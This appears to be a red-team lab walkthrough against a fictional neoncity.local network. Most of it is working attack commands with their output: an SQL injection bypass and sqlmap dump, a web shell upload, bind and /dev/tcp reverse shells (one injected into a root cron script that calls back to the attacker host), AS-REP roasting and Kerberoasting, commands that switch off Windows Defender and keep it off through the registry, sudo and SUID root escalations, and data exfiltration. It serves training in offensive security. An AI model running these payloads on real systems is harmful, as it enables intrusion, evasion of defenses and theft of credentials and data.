Section 04

Attack Platform Setup - Your Kali Toolkit

Every step in this exercise runs from standard Kali Linux tooling - no team server, no licence, no beacon. Recon, exploitation, credential attacks, lateral movement, and post-exploitation all use native or freely available tools already on (or easily added to) Kali.

Requirements
Kali Linux 2024+ at 10.10.10.100 with the standard toolset: nmap, gobuster/ffuf, sqlmap, hydra, john/hashcat, the Impacket suite, evil-winrm, and a copy of Mimikatz or SharpKatz staged locally for upload. The lab network (10.10.10.0/24) is flat, so every host is directly reachable - no pivoting or SOCKS proxy is required.

# Confirm the core toolkit is installed
which nmap gobuster sqlmap hydra john hashcat evil-winrm impacket-secretsdump
# Install anything missing (Kali ships most of this by default)
sudo apt update && sudo apt install -y gobuster sqlmap hydra john hashcat python3-impacket evil-winrm
2. Stage Tools & Payloads

Stage a copy of Mimikatz (or SharpKatz) for credential dumping and a PHP web shell for the initial foothold, then stand up a simple file server so compromised hosts can pull tools from Kali.

bash - Stage Local Tools
# Keep post-ex binaries in one place for easy hosting
mkdir -p /home/kali/tools /home/kali/loot && ls /home/kali/tools/
# Expect mimikatz.exe (or SharpKatz.exe) staged in /home/kali/tools
# Host anything you need to pull onto a target over HTTP
python3 -m http.server 8888
3. Confirm Network Reachability

The lab network is flat - Kali sits on the same /24 as every target, so there's no SOCKS proxy or pivot to configure yet. Just confirm you can reach the range before starting recon.

bash - Confirm Reachability
nmap -sn 10.10.10.0/24

Mission Briefing

Operation Neon Oasis

BRIEFING

You Are the Adversary

It's 02:47 AM. A rain-slicked neon glow reflects off the towers of the Neon Oasis Apartments - a crumbling residential complex in the heart of NeonCity's underbelly. Beneath the flickering holographic billboards and the hum of drone traffic, a quiet network hums with secrets.

Your handler has given you a single objective: full domain compromise of the neoncity.local Active Directory environment. The client - a shadowy corporation that owns the building - suspects internal data theft and wants to know exactly how far an adversary could get. They've authorized a no-holds-barred red team engagement.

You have your Kali machine on the same network segment. Your attack toolkit is staged and ready. You know nothing about the targets yet - just an IP range: 10.10.10.0/24. Everything else, you discover on your own.

The residents of Neon Oasis don't know you're here. A fried chicken shop owner with a double life. A girl who reuses her passwords everywhere. A genius mechanic with too many privileges. A corporate drone running a service nobody monitors. A hacker who got cocky. A kid whose brain implant is running unpatched firmware. And a cop who thinks his domain is secure.

They're all about to have a very bad night.

RULES OF ENGAGEMENT:
▶ Compromise all 6 resident user accounts and Officer George's DA account
▶ Establish a persistent remote-access foothold on every machine (4 minimum)
▶ Dump the full domain password database
▶ Exfiltrate all sensitive data to your Kali machine
▶ Document every step with MITRE ATT&CK technique IDs

Attack Phase 01

Reconnaissance

PHASE 1

Map the network before touching a service

Every engagement starts the same way - you don't kick down the front door without knowing what's on the other side. Before you touch a single service, you need to understand the network topology, identify every live machine, catalog every open port, and map every running service. In a real engagement, this is the phase that separates amateurs from operators. The more you know before your first exploit fires, the less noise you make.

Network reconnaissance
Active reconnaissance involves directly probing target systems to discover hosts, open ports, and services. Tools like Nmap send carefully crafted packets and interpret responses to fingerprint operating systems and application versions. This is loud - it leaves logs. In a real engagement, you'd throttle scans and use timing options. In this lab, speed is fine. The key output: a map of every door and window in the building.
Step 1 - Host Discovery: Who's Home?

First, a quick ping sweep to find which IPs on the subnet are alive. You're looking for the heartbeat of every machine in the building.

nmap -sn 10.10.10.0/24

# -sV: Service version detection
# -O:  OS fingerprinting

Step 3 - SMB Enumeration: Knock on the Domain's Door
SMB enumeration
Server Message Block (SMB) is Windows' native file-sharing protocol. Poorly configured SMB often allows anonymous or null session access, leaking share names, domain users, password policies, and group memberships. Think of it as checking if the building's directory board in the lobby tells you more than it should - like which apartments are occupied and who has a master key.

The DC has SMB wide open with signing disabled. Let's see what we can pull without any credentials at all.

bash - SMB Anonymous Recon
# List shares accessible to anonymous users
crackmapexec smb 10.10.10.10 -u '' -p '' --shares
SMB  10.10.10.10  445  NEONCITY-DC01  [+] neoncity.local\:
SMB  10.10.10.10  445  NEONCITY-DC01  CorpShare       READ
SMB  10.10.10.10  445  NEONCITY-DC01  IPC$            READ
SMB  10.10.10.10  445  NEONCITY-DC01  NETLOGON        READ
SMB  10.10.10.10  445  NEONCITY-DC01  SYSVOL          READ

# CorpShare is readable anonymously. That's a misconfiguration
# you'd see in the wild more often than you'd think.

# Enumerate domain users (null session)
crackmapexec smb 10.10.10.10 -u '' -p '' --users
SMB  10.10.10.10  445  NEONCITY-DC01  george.admin
SMB  10.10.10.10  445  NEONCITY-DC01  amy.chen
SMB  10.10.10.10  445  NEONCITY-DC01  keira.mech
SMB  10.10.10.10  445  NEONCITY-DC01  jack.corp

# Full enum for password policy, groups, etc.
enum4linux -a 10.10.10.10
# Password Policy: Minimum length = 7, Complexity = OFF, Lockout = 0
# ← No lockout means we can brute force without consequence

Step 5 - FTP Anonymous Access: Dumpster Diving in the Lobby
Anonymous FTP
FTP servers configured for anonymous access let anyone connect without credentials. It's the digital equivalent of leaving filing cabinets unlocked in the lobby. In real engagements, anonymous FTP is still shockingly common - especially on internal networks where admins assume "nobody from outside can reach it anyway."

You now see the entire building. Four machines, seven residents, a stack of misconfigurations, and a web app that's practically begging to be exploited. Your initial attack vector is clear: Rex's web server is the weakest exterior wall. The web app has a login page ripe for injection, a config file the robots.txt kindly pointed you toward, a hidden clinic portal, and a file upload feature. That's your way in.

The engagement map in your head should look like this: Web server → credential harvest → pivot to Windows workstation → escalate → move to DC → own the domain → circle back for the Linux boxes → exfil everything.

What defenders would see:
• Event ID 4625 - Failed logon attempts during SMB null session attempts

Attack Phase 02

Initial Access

PHASE 2

SQL injection to web shell on Rex's web application

Rex leads a double life. By day, he flips chicken at Neon Eats. By night, he runs an underground clinic out of the back of the building. His web server hosts both operations - and he coded the ordering system himself. Self-taught devs who skip security 101 are a red teamer's best friend.

Your recon found a login page, a config file path, a hidden clinic portal, and an upload directory. You're going to walk through the front door of his chicken shop, raid his database, upload a web shell through his admin panel, and turn his web server into your first foothold. From there, you'll harvest credentials that open doors all across the network - because people in NeonCity reuse their passwords like it's a civic duty.

Task You'll use two methods here: first a manual SQLi bypass to confirm the vulnerability, then sqlmap for full database extraction. Run them in order. The manual test should return a 302 redirect. If you get a 200 with the login page, the injection syntax is wrong - check your quoting.
Step 1 - SQL Injection: Picking the Lock on the Login Page
SQL injection
SQL Injection exploits applications that build database queries by directly concatenating user input into SQL statements. When a login form takes your username and drops it raw into SELECT * FROM users WHERE username='INPUT', you can inject SQL syntax to alter the query's logic. The classic ' OR 1=1-- - turns the query into "select all users where true" - bypassing authentication entirely. This vulnerability has been in the OWASP Top 10 since the list was created and is still one of the most common findings in web application pentests. Rex didn't use parameterized queries. His loss.

The Neon Eats login page passes user input straight into a SQL query with zero sanitization. You're going to bypass authentication and then use sqlmap to dump the entire database - every user, every password, stored in plaintext because Rex never learned about hashing either.

bash - SQL Injection Attack
# Manual authentication bypass - the classic
curl -X POST http://10.10.10.30/neoneats/login.php \
  -d "username=admin' OR 1=1-- -&password=anything" -v
< HTTP/1.1 302 Found
< Location: dashboard.php
< Set-Cookie: PHPSESSID=abc123...
# You're in. The query became:
# SELECT * FROM users WHERE username='admin' OR 1=1-- -' AND password='anything'
# Everything after -- is a comment. 1=1 is always true. Welcome, admin.

# Now let's go nuclear - dump the entire database with sqlmap
sqlmap -u "http://10.10.10.30/neoneats/login.php" \
  --data="username=test&password=test" \
  --dbms=mysql --dump --batch

[*] Database: neon_eats
[*] Table: users
+----+----------+----------------+---------------------------+-----------+
| id | username | password       | email                     | role      |
+----+----------+----------------+---------------------------+-----------+
| 1  | rex      | N30nE@ts#Chef  | rex@neoncity.local        | admin     |
| 2  | amy      | FriedCh1cken!  | amy.chen@neoncity.local   | customer  |
| 3  | keira    | M3ch@n1cGr1p!  | keira.mech@neoncity.local | customer  |
| 4  | jack     | Corp0r@te2024  | jack.corp@neoncity.local  | customer  |
| 5  | mark     | H@ck3rM@n!     | mark@neoncity.local       | customer  |
+----+----------+----------------+---------------------------+-----------+

# Five usernames. Five plaintext passwords. Three of them
# have @neoncity.local email addresses - domain accounts.
# If they reuse these passwords on the domain...
# you just got the keys to the kingdom from a chicken shop.
Expected resultThe sqlmap --dump should produce a table with 5 users and their plaintext passwords. Write all 5 down - you'll use them throughout the rest of the exercise. If sqlmap prompts you with questions, accept the defaults (press Enter) or use --batch.
Step 2 - Config File Harvesting: Reading Rex's Diary

Remember robots.txt pointing to /neoneats/config.php? If the PHP engine is running, browsing to it won't show the source - but sqlmap has a file-read capability that can pull files from the filesystem through the SQLi vulnerability.

bash - File Read via SQLi
sqlmap -u "http://10.10.10.30/neoneats/login.php" \
  --data="username=test&password=test" \
  --file-read="/var/www/html/neoneats/config.php" --batch

# Retrieved config.php contents:
$db_user = "rex";
$db_pass = "N30nE@ts#Chef";

$smtp_user = "amy.chen@neoncity.local";
$smtp_pass = "FriedCh1cken!";

$backup_host = "10.10.10.10";
$backup_user = "jack.corp";
$backup_pass = "Corp0r@te2024";

# Rex hardcoded EVERYTHING. The config file confirms:
# - Amy's domain password (SMTP integration)
# - Jack's password connecting to the DC for backups
# - The DC's IP as the backup target
Task First create the PHP shell file on your Kali machine. Then use curl to grab an admin cookie via SQLi bypass, and upload the shell through the file upload form. Test it with ?cmd=id - you should see uid=33(www-data). If you get a 404, the upload path may differ - check the dashboard response.
Step 3 - Web Shell Upload: Moving In
Web shells
A web shell is a script (PHP, ASP, JSP) uploaded to a web server that gives you command execution through HTTP requests. When an application allows file uploads without validating file types, you can upload a PHP file that calls system() on whatever you pass it. The admin dashboard has an "Upload Menu Image" feature with zero file type validation. Rex was expecting JPEG files. He's about to get a PHP reverse shell instead.
bash - Web Shell Deployment
# Create a simple PHP command shell
echo '#' > shell.php
# Grab admin session cookie via SQLi bypass
curl -c cookies.txt -X POST http://10.10.10.30/neoneats/login.php \
  -d "username=admin' OR 1=1-- -&password=x"

# Upload shell.php through the "menu image" upload
curl -b cookies.txt -X POST http://10.10.10.30/neoneats/dashboard.php \
  -F "menu_image=@shell.php"
File uploaded: uploads/shell.php

# Test it - execute 'id' on the server
curl "http://10.10.10.30/neoneats/uploads/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# You have command execution on Rex's web server.
# You're www-data - the Apache process user.
# Time to upgrade this to a proper reverse shell.
Step 4 - Catch a Reverse Shell on WEB01: Your First Foothold

You have command execution via the web shell. Now upgrade to something you can actually work from - trigger a netcat reverse shell through the web shell, catch it, upgrade the TTY, and use it as the jump-off point for the Windows side of the network.

KKALI STANDALONE
KALI STANDALONE
bash - Netcat Reverse Shell (No C2)
# In another terminal, trigger via web shell:
curl -G "http://10.10.10.30/neoneats/uploads/shell.php" --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

Step 1 - Credential Spraying with CrackMapExec
Credential stuffing / password spraying
CrackMapExec (CME) is a Swiss army knife for Active Directory pentesting. It can validate credentials against SMB, WinRM, RDP, LDAP, and more. When CME returns [+], the creds are valid. When it returns (Pwn3d!), the user has local administrator rights on that machine - meaning you can execute commands, dump hashes, and deploy implants. The difference between "valid" and "Pwn3d!" is the difference between reading mail and owning the server.

Step 2 - AS-REP Roasting Amy's Account
As-rep roasting
In Kerberos authentication, the first step is the AS-REQ/AS-REP exchange where the client proves identity to the KDC. Normally, the client must encrypt a timestamp with their password hash (pre-authentication). But if "Do not require Kerberos preauthentication" is enabled on an account, anyone can request an encrypted ticket for that user - and then attempt to crack it offline. The encryption is based on the user's password, so weak passwords fall to tools like Hashcat. It's like intercepting a locked box where you know the lock type and can try keys at home with no limit on attempts.

Let's check if any accounts have pre-authentication disabled - a misconfiguration that lets you grab crackable hashes without any credentials at all.

bash - AS-REP Roasting
# Create a user list from our recon
echo -e "amy.chen\nkeira.mech\njack.corp\ngeorge.admin" > users.txt
# Request AS-REP hashes for users without pre-auth
impacket-GetNPUsers neoncity.local/ -dc-ip 10.10.10.10 \
  -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
[*] Getting TGT for amy.chen
$krb5asrep$23$amy.chen@NEONCITY.LOCAL:a8d9f2e3b1c4...

# Amy's account has pre-auth disabled!
# We now have a hash we can crack offline.

# Crack with Hashcat (mode 18200 = Kerberos AS-REP)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
$krb5asrep$23$amy.chen@NEONCITY.LOCAL:FriedCh1cken!
# Confirms what we already knew - but this path works even
# without the web app compromise. Two roads to the same creds.
Credentials validated

Step 2 - Neutralizing Windows Defender
Defence evasion
Before deploying payloads, sophisticated attackers disable or weaken endpoint protection. With admin rights, you can disable Windows Defender's real-time monitoring, behavior analysis, script scanning, and cloud-delivered protection. You can also add exclusion paths so Defender ignores specific directories. In real engagements, this is done surgically - disable just enough to land your implant, then re-enable to reduce detection footprint. In this lab, you'll go scorched earth because the point is to understand every lever.
Evil-WinRM - Defender Downgrade
# Check current Defender status
Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring
# Disable every protection layer
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0
# Add exclusion for our payload directory
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionProcess "neon_update.exe"
# Make it persistent via registry (survives reboot)
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" `
  -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force

# Defender is fully neutralized. The workstation is blind.

Attack Phase 06

Kerberoasting

PHASE 6

Requesting and cracking a service ticket for Jack's SPN

Jack is a regular employee. He shows up, does his job at the giant corp, goes home. He has no idea that his account has a Service Principal Name (SPN) registered for MSSQL - someone in IT set it up years ago for a database integration and never cleaned it up. That SPN makes Jack's account vulnerable to one of the most effective Active Directory attacks in the red team playbook: Kerberoasting.

Kerberoasting
In Active Directory, services authenticate using Kerberos. When an account has an SPN (Service Principal Name), any authenticated domain user can request a Ticket Granting Service (TGS) ticket for that service. The TGS ticket is encrypted with the service account's NTLM hash - which is derived from its password. Here's the critical part: you don't need any special privileges to request this ticket. Any domain user account works. Once you have the ticket, you take it offline and crack it with Hashcat. There are no failed login attempts, no account lockouts, no alerts. The KDC happily hands you an encrypted blob, and you brute-force it at your leisure. This is why service accounts with weak passwords are such a critical vulnerability - and why Jack's password "Corp0r@te2024" is about to be cracked in under a minute.
Task Use impacket-GetUserSPNs with Amy's domain credentials to request TGS tickets for all accounts with SPNs. You should find Jack's MSSQLSvc SPN. The hash will be saved to a file for offline cracking. If no SPNs are returned, verify Amy's credentials are valid: crackmapexec smb 10.10.10.10 -u amy.chen -p 'FriedCh1cken!'.
Step 1 - Kerberoast via Impacket (Remote, No Disk Touch)

Request TGS tickets for every SPN-registered account directly from Kali using Amy's domain credentials. Nothing touches the target's disk - the whole attack runs remotely over the network.

Step 3 - Privilege Escalation: Sudo Nmap Escape
Sudo misconfiguration and GTFOBins
When a user has sudo access to run specific programs, those programs can sometimes be abused to escape to a root shell. GTFOBins is a curated list of Unix binaries that can be exploited for privilege escalation when they have SUID or sudo permissions. nmap has an interactive mode that drops you into a shell - and if you're running nmap with sudo, that shell runs as root. This is a textbook misconfiguration: the admin wanted to let Mark run network scans without giving him full root. Instead, they gave him full root with extra steps.
bash - Sudo Abuse → Root
# Check what Mark can run as sudo
sudo -l
User mark may run the following commands on NEONCITY-LNX01:
    (ALL) NOPASSWD: /usr/bin/nmap

# NOPASSWD nmap. No password required. This is game over.

# GTFOBins: nmap interactive mode drops to shell
sudo nmap --interactive
Starting Nmap V. 7.80 ( https://nmap.org )
Welcome to Interactive Mode -- press h for help
nmap>
!sh
# whoami
root

# Root in two commands. Mark's sudo nmap privilege
# was the digital equivalent of giving someone a
# Swiss Army knife and telling them to only use the corkscrew.
Step 4 - Compromise Max: BrainSync Command Injection
Command injection
Command injection occurs when an application passes user input directly to a system shell command (like exec() or system()) without sanitization. Max's BrainSync app has a hidden diagnostic endpoint that takes a cmd parameter and runs it through Node.js's child_process.exec(). This is remote code execution through a web API - the attacker just needs to URL-encode their commands. Max's "brain chip" is essentially running unpatched firmware with a debug console exposed to the network.

Let's take the other path. Even without Mark's SSH access, Max's BrainSync app has a fatal vulnerability.

bash - BrainSync Command Injection
# The /api/diag endpoint takes a 'cmd' parameter
# and pipes it straight to exec(). Max's brain chip
# has a debug console wide open.
curl "http://10.10.10.40:8080/api/diag?cmd=id"
uid=1001(max) gid=1001(max) groups=1001(max)

Step 5 - Root via Cron Hijack: Max's Broken Brain Chip
Cron job hijacking
Cron is Linux's task scheduler. Jobs defined in /etc/cron.d/ or /etc/crontab run automatically at specified intervals. The critical vulnerability here: the brainsync.sh script runs as root every 5 minutes, but the script file itself is world-writable (chmod 777). Any user on the system can modify the script's contents, and root will execute whatever they put in it on the next cron cycle. It's as if someone left a signed blank check on the kitchen counter and set a robot to cash it every 5 minutes.
bash - Cron Hijack to Root
# Examine the vulnerable cron job
cat /etc/cron.d/brainsync
*/5 * * * * root /opt/brainsync/brainsync.sh
ls -la /opt/brainsync/brainsync.sh
-rwxrwxrwx 1 max max 201 Nov 15 /opt/brainsync/brainsync.sh

# World-writable. Runs as root. Every 5 minutes.
# This is the most dangerous combination in Linux privilege escalation.

# Inject a reverse shell into the cron script
echo 'bash -i >& /dev/tcp/10.10.10.100/6666 0>&1' >> /opt/brainsync/brainsync.sh
# Start listener on Kali and wait (max 5 minutes)
nc -nlvp 6666
Connection from 10.10.10.40
root@NEONCITY-LNX01:/# whoami
root

# ROOT via cron hijack. Max's brain chip (brainsync) just
# executed your payload with root privileges. His compromised
# neural implant is now YOUR compromised neural implant.
Step 6 - Bonus: SUID Binary Privilege Escalation
SUID binary abuse
When a binary has the SUID bit set (-rwsr-xr-x), it runs with the file owner's permissions - usually root - regardless of who executes it. If a SUID binary can be tricked into spawning a shell (like find -exec), that shell inherits root privileges. Sysadmins sometimes create custom SUID binaries for convenience and forget to remove them. The find binary with SUID is a classic GTFOBins escalation vector.
bash - SUID Abuse (Third Path to Root)
# Hunt for SUID binaries
find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/find-suid
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
...

# /usr/local/bin/find-suid - a custom SUID binary.
# Someone copied 'find' and forgot to clean up.

# Abuse SUID find to spawn a root bash shell
/usr/local/bin/find-suid . -exec /bin/bash -p \;
bash-5.1# whoami
root
# The -p flag preserves the effective UID (root from SUID)

Attack Phase 09

Data Exfiltration

PHASE 9

Collecting and staging the objective data

In a real red team engagement, compromise without proof is just trespassing. Your client wants to see what an adversary could actually take. You're going to systematically collect sensitive data from every compromised machine - employee records, plaintext passwords, database dumps, credential caches, SSH keys - stage it, compress it, and exfiltrate it back to your Kali machine through multiple channels. This demonstrates the business impact: it's not just "someone could get in," it's "someone could walk out with everything."

Data exfiltration
Exfiltration is the final stage of most attack chains. Adversaries collect data from compromised systems, stage it in a temporary location, compress or encrypt it to reduce size and avoid content inspection, then transfer it out via direct SMB/SCP transfers or covert channels like DNS tunneling and HTTP(S). Direct SCP or SMB is the simplest option here and fastest for large files. In environments with DLP (Data Loss Prevention), attackers may split data into small chunks or encode it. In this lab, you'll use straightforward methods because the point is demonstrating capability, not stealth.
Task Work through each compromised host systematically. Collect data from the DC (CorpShare), WEB01 (MySQL dump), LNX01 (Mark's loot), and WS01 (registry creds, SSH keys). Compress everything, then exfiltrate via Evil-WinRM download or direct SCP/SMB. Verify your final loot directory has all files listed in the checklist below.
